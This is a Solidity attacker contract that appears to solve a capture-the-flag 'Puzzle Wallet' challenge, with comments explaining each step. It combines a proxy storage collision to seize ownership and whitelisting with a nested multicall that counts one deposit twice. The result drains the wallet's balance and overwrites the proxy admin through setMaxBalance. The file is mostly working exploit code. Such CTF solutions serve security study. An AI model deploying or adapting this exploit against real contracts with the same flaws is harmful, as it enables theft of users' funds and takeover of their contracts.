// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPuzzle {
    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) payable external;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract PuzzleAttacker {
    IPuzzle public challenge;

    constructor(address challengeAddress) {
        challenge = IPuzzle(challengeAddress);
    }

    function attack() public payable {
        //all contract calls are sent to the proxy (PuzzleProxy), which forwards them via delegatecall's to the IC (implementation contract : PuzzleWallet)
        //in the proxy, we have 2 state variables (pendingAdmin & admin), which are mapped by owner & maxBalance in the IC
        //to change admin in the proxy, we need to change maxBalance in the IC
        //to change maxBalance we need to get whitelisted
        //to get whitelisted, we need to become the owner of the IC => we can do this by changing pendingAdmin in the proxy
        challenge.proposeNewAdmin(address(this));
        challenge.addToWhitelist(address(this));

        //to change maxBalance, we first need to set the contract balance to 0
        //to set the contract balance to 0, we need to call execute and send all contract funds to ourselves => the initial contract balance is 0.001 ETH
        //so, we somehow need to increase our contract balance (balances mapping) to 0.002 ETH while sending only 0.001 ETH, by calling deposit
        //we can do this by using the multicall method, specifying 2 calls in the bytes array and forwarding 0.001 ETH
        //1: a call to deposit => this is a delegatecall, so, we won't pass along any ETH =>
        //msg.value in the delegate called method (deposit) is the same as msg.value in the original call that initiated the delegate call => 0.001 ETH
        //2: a call to multicall (yes, from within multicall) and the bytes[] of that multicall specifies our second call to deposit
        //that way, we will pass "require(!depositCalled..." in multicall on the second call to deposit
        //and, "balances[msg.sender] += msg.value;" gets executed twice (in deposit) => making our balaance = 0.002 ETH
        bytes[] memory deposit_data = new bytes[](1);
        deposit_data[0] = abi.encodeWithSelector(challenge.deposit.selector);

        bytes[] memory data = new bytes[](2);
        data[0] = deposit_data[0]; // first call to deposit
        data[1] = abi.encodeWithSelector(challenge.multicall.selector, deposit_data); //second call to multicall, which calls another deposit
        
        challenge.multicall{value: 0.001 ether}(data);

        //now, we can call execute with 0.002 ETH and set the contract balance to 0
        challenge.execute(msg.sender, 0.002 ether, "");

        //and finally, we call setMaxBalance and we provide our address casted to uint256        
        challenge.setMaxBalance(uint256(uint160(msg.sender)));        
    } 
}